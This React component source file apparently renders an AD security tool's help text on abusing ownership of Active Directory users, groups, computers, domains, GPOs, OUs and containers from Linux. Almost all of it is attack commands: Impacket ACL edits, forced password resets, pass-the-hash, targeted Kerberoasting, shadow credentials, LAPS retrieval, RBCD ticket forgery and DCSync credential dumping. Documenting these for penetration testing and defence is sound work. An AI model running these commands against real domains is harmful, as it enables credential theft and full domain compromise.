import React from 'react';
import PropTypes from 'prop-types';

const LinuxAbuse = ({
    sourceName,
    sourceType,
    targetName,
    targetType,
    targetId,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <p>
                        To change the ownership of the object, you may use Impacket's owneredit
                        example script (cf. "grant ownership" reference for the exact link).
                    </p>

                    <pre>
                        <code>
                            {
                                "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                            }
                        </code>
                    </pre>

                    <h4> Modifying the rights </h4>

                    <p>
                        To abuse ownership of a group object, you may grant
                        yourself the AddMember privilege.
                    </p>

                    <p>
                        Impacket's dacledit can be used for that purpose (cf.
                        "grant rights" reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"
                            }
                        </code>
                    </pre>

                    <h4> Adding to the group </h4>

                    <p>
                        You can now add members to the group.
                    </p>

                    <p>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line:
                    </p>

                    <pre>
                        <code>
                            {
                                'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <p>
                        Pass-the-hash can also be done here with <a href='https://github.com/byt3bl33d3r/pth-toolkit'>pth-toolkit's net tool</a>.
                        If the LM hash is not known it must be replace with <code>ffffffffffffffffffffffffffffffff</code>.
                    </p>

                    <pre>
                        <code>
                            {
                                'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <p>
                        Finally, verify that the user was successfully added to the group:
                    </p>

                    <pre>
                        <code>
                            {
                                'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <h4> Cleanup </h4>

                    <p>
                        Impacket's dacledit can be used for that purpose (cf.
                        "grant rights" reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"
                            }
                        </code>
                    </pre>
                </>
            );

        case 'User':
            return (
                <>
                    <p>
                        To change the ownership of the object, you may use Impacket's owneredit
                        example script (cf. "grant ownership" reference for the exact link).
                    </p>

                    <pre>
                        <code>
                            {
                                "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                            }
                        </code>
                    </pre>

                    <p>
                        To abuse ownership of a user object, you may grant
                        yourself the GenericAll privilege.
                    </p>

                    <p>
                        Impacket's dacledit can be used for that purpose (cf.
                        "grant rights" reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"
                            }
                        </code>
                    </pre>

                    <p>
                        Cleanup of the added ACL can be performed later on with the same tool:
                    </p>

                    <h4> Targeted Kerberoast </h4>

                    <p>
                        A targeted kerberoast attack can be performed using{' '}
                        <a href='https://github.com/ShutdownRepo/targetedKerberoast'>targetedKerberoast.py</a>.
                    </p>

                    <pre>
                        <code>
                            {
                                "targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"
                            }
                        </code>
                    </pre>

                    <p>
                        The tool will automatically attempt a targetedKerberoast
                        attack, either on all users or against a specific one if
                        specified in the command line, and then obtain a crackable hash.
                        The cleanup is done automatically as well.
                    </p>

                    <p>
                        The recovered hash can be cracked offline using the tool
                        of your choice.
                    </p>

                    <h4> Force Change Password </h4>

                    <p>
                        Use samba's net tool to change the user's password. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line. The new password will be prompted
                        if omitted from the command line.
                    </p>

                    <pre>
                        <code>
                            {
                                'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <p>
                        Pass-the-hash can also be done here with <a href='https://github.com/byt3bl33d3r/pth-toolkit'>pth-toolkit's net tool</a>.
                        If the LM hash is not known it must be replace with <code>ffffffffffffffffffffffffffffffff</code>.
                    </p>

                    <pre>
                        <code>
                            {
                                'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                            }
                        </code>
                    </pre>
                    <p>
                        Now that you know the target user's plain text password, you can
                        either start a new agent as that user, or use that user's
                        credentials in conjunction with PowerView's ACL abuse functions,
                        or perhaps even RDP to a system the target user has access to.
                        For more ideas and information, see the references tab.
                    </p>

                    <h4> Shadow Credentials attack </h4>

                    <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>

                    <pre>
                        <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
                    </pre>

                    <p>
                        For other optional parameters, view the pyWhisker documentation.
                    </p>
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <p>
                            To change the ownership of the object, you may use Impacket's owneredit
                            example script (cf. "grant ownership" reference for the exact link).
                        </p>

                        <pre>
                            <code>
                                {
                                    "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                                }
                            </code>
                        </pre>

                        <p>
                            To abuse ownership of a computer object, you may
                            grant yourself the GenericAll privilege.
                        </p>

                        <p>
                        Impacket's dacledit can be used for that purpose (cf.
                        "grant rights" reference for the link).
                        </p>

                        <pre>
                            <code>
                                {
                                    "dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"
                                }
                            </code>
                        </pre>

                        <p>
                            Cleanup of the added ACL can be performed later on with the same tool:
                        </p>

                        <h4> Retrieve LAPS Password </h4>

                        <p>
                            Full control of a computer object is abusable when
                            the computer's local admin account credential is
                            controlled with LAPS. The clear-text password for
                            the local administrator account is stored in an
                            extended attribute on the computer object called
                            ms-Mcs-AdmPwd. With full control of the computer
                            object, you may have the ability to read this
                            attribute, or grant yourself the ability to read the
                            attribute by modifying the computer object's
                            security descriptor.
                        </p>

                        <p>
                            <a href='https://github.com/p0dalirius/pyLAPS'>pyLAPS</a> can be used
                             to retrieve LAPS passwords:
                        </p>

                        <pre>
                            <code>
                                {
                                    'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'
                                }
                            </code>
                        </pre>

                        <h4> Resource-Based Constrained Delegation </h4>

                        First, if an attacker does not control an account with an
                        SPN set, a new attacker-controlled computer account can be
                        added with Impacket's addcomputer.py example script:
                        <pre>
                            <code>
                                {
                                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                                }
                            </code>
                        </pre>
                        We now need to configure the target object so that the attacker-controlled
                        computer can delegate to it. Impacket's rbcd.py script can be used for that
                        purpose:
                        <pre>
                            <code>
                                {
                                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                                }
                            </code>
                        </pre>
                        And finally we can get a service ticket for the service name (sname) we
                        want to "pretend" to be "admin" for. Impacket's getST.py example script
                        can be used for that purpose.
                        <pre>
                            <code>
                                {
                                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                                }
                            </code>
                        </pre>
                        This ticket can then be used with Pass-the-Ticket, and could grant access
                        to the file system of the TARGETCOMPUTER.

                        <h4> Shadow Credentials attack </h4>

                        <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>

                        <pre>
                            <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
                        </pre>

                        <p>
                            For other optional parameters, view the pyWhisker documentation.
                        </p>
                    </>
                );
            } else {
                return (
                    <>
                        <p>
                            To change the ownership of the object, you may use Impacket's owneredit
                            example script (cf. "grant ownership" reference for the exact link).
                        </p>

                        <pre>
                            <code>
                                {
                                    "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                                }
                            </code>
                        </pre>

                        <p>
                            To abuse ownership of a computer object, you may
                            grant yourself the GenericAll privilege.
                        </p>

                        <p>
                        Impacket's dacledit can be used for that purpose (cf.
                        "grant rights" reference for the link).
                        </p>

                        <pre>
                            <code>
                                {
                                    "dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"
                                }
                            </code>
                        </pre>

                        <p>
                            Cleanup of the added ACL can be performed later on with the same tool:
                        </p>

                        <h4> Resource-Based Constrained Delegation </h4>

                        First, if an attacker does not control an account with an
                        SPN set, a new attacker-controlled computer account can be
                        added with Impacket's addcomputer.py example script:
                        <pre>
                            <code>
                                {
                                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                                }
                            </code>
                        </pre>
                        We now need to configure the target object so that the attacker-controlled
                        computer can delegate to it. Impacket's rbcd.py script can be used for that
                        purpose:
                        <pre>
                            <code>
                                {
                                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                                }
                            </code>
                        </pre>
                        And finally we can get a service ticket for the service name (sname) we
                        want to "pretend" to be "admin" for. Impacket's getST.py example script
                        can be used for that purpose.
                        <pre>
                            <code>
                                {
                                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                                }
                            </code>
                        </pre>
                        This ticket can then be used with Pass-the-Ticket, and could grant access
                        to the file system of the TARGETCOMPUTER.

                        <h4> Shadow Credentials attack </h4>

                        <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>

                        <pre>
                            <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
                        </pre>

                        <p>
                            For other optional parameters, view the pyWhisker documentation.
                        </p>
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <p>
                        To change the ownership of the object, you may use Impacket's owneredit
                        example script (cf. "grant ownership" reference for the exact link).
                    </p>

                    <pre>
                        <code>
                            {
                                "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                            }
                        </code>
                    </pre>

                    <p>
                        To abuse ownership of a domain object, you may grant
                        yourself the DcSync privileges.
                    </p>

                    <p>
                        Impacket's dacledit can be used for that purpose (cf.
                        "grant rights" reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"
                            }
                        </code>
                    </pre>

                    <p>
                        Cleanup of the added ACL can be performed later on with the same tool:
                    </p>

                    <h4> DCSync </h4>

                    <p>
                        The AllExtendedRights privilege grants {sourceName} both the
                        DS-Replication-Get-Changes and
                        DS-Replication-Get-Changes-All privileges, which combined
                        allow a principal to replicate objects from the domain{' '}
                        {targetName}.
                    </p>

                    <p>
                        This can be abused using Impacket's secretsdump.py example script:
                    </p>

                    <pre>
                            <code>
                                {
                                    "secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"
                                }
                            </code>
                    </pre>

                    <h4> Retrieve LAPS Passwords </h4>

                    <p>
                        If FullControl (GenericAll) is obtained on the domain,
                        instead of granting DCSync rights, the AllExtendedRights
                        privilege included grants {sourceName} enough{' '}
                        privileges to retrieve LAPS passwords domain-wise.
                    </p>

                    <p>
                        <a href="https://github.com/p0dalirius/pyLAPS">pyLAPS</a> can be used
                         for that purpose:
                    </p>

                    <pre>
                        <code>
                            {
                                'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'
                            }
                        </code>
                    </pre>
                </>
            );
        case 'GPO':
            return (
                <>
                    <p>
                        To change the ownership of the object, you may use Impacket's owneredit
                        example script (cf. "grant ownership" reference for the exact link).
                    </p>

                    <pre>
                        <code>
                            {
                                "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                            }
                        </code>
                    </pre>

                    <p>
                        To abuse ownership of a GPO, you may
                        grant yourself the GenericAll privilege.
                    </p>

                    <p>
                    Impacket's dacledit can be used for that purpose (cf.
                    "grant rights" reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"
                            }
                        </code>
                    </pre>

                    <p>
                        Cleanup of the added ACL can be performed later on with the same tool:
                    </p>

                    <p>
                        With full control of a GPO, you may make modifications
                        to that GPO which will then apply to the users and
                        computers affected by the GPO. Select the target object
                        you wish to push an evil policy down to, then use the
                        gpedit GUI to modify the GPO, using an evil policy that
                        allows item-level targeting, such as a new immediate
                        scheduled task. Then wait at least 2 hours for the group
                        policy client to pick up and execute the new evil
                        policy. See the references tab for a more detailed write
                        up on this abuse.
                    </p>

                    <p>
                        <a href="https://github.com/Hackndo/pyGPOAbuse">pyGPOAbuse.py</a> can be used for that purpose.
                    </p>
                </>
            );
        case 'OU':
            return (
                <>
                    <p>
                        To change the ownership of the object, you may use Impacket's owneredit
                        example script (cf. "grant ownership" reference for the exact link).
                    </p>

                    <pre>
                        <code>
                            {
                                "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                            }
                        </code>
                    </pre>

                    <h4>Control of the Organization Unit</h4>

                    <p>
                        With ownership of the OU object, you may grant yourself
                        the GenericAll privilege.
                    </p>

                    <h4>Generic Descendent Object Takeover</h4>
                    <p>
                        The simplest and most straight forward way to abuse
                        control of the OU is to apply a GenericAll ACE on the OU
                        that will inherit down to all object types. This
                        can be done using Impacket's dacledit (cf. "grant rights"
                        reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"
                            }
                        </code>
                    </pre>

                    <p>
                        Now, the "JKOHLER" user will have full control of all
                        descendent objects of each type.
                    </p>

                    <h4>Targeted Descendent Object Takeoever</h4>

                    <p>
                        If you want to be more targeted with your approach, it
                        is possible to specify precisely what right you want to
                        apply to precisely which kinds of descendent objects.
                        Refer to the Windows Abuse info for this.
                    </p>
                </>
            );
        case 'Container':
            return (
                <>
                    <p>
                        To change the ownership of the object, you may use Impacket's owneredit
                        example script (cf. "grant ownership" reference for the exact link).
                    </p>

                    <pre>
                        <code>
                            {
                                "owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"
                            }
                        </code>
                    </pre>

                    <h4>Control of the Container</h4>

                    <p>
                        With ownership of the container object, you may grant yourself
                        the GenericAll privilege.
                    </p>

                    <h4>Generic Descendent Object Takeover</h4>
                    <p>
                        The simplest and most straight forward way to abuse
                        control of the OU is to apply a GenericAll ACE on the OU
                        that will inherit down to all object types. This
                        can be done using Impacket's dacledit (cf. "grant rights"
                        reference for the link).
                    </p>

                    <pre>
                        <code>
                            {
                                "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"
                            }
                        </code>
                    </pre>

                    <p>
                        Now, the "JKOHLER" user will have full control of all
                        descendent objects of each type.
                    </p>

                    <h4>Targeted Descendent Object Takeoever</h4>

                    <p>
                        If you want to be more targeted with your approach, it
                        is possible to specify precisely what right you want to
                        apply to precisely which kinds of descendent objects.
                        Refer to the Windows Abuse info for this.
                    </p>
                </>
            );
    }
};

LinuxAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
    targetName: PropTypes.string,
    targetType: PropTypes.string,
    targetId: PropTypes.string,
    haslaps: PropTypes.bool,
};

export default LinuxAbuse;
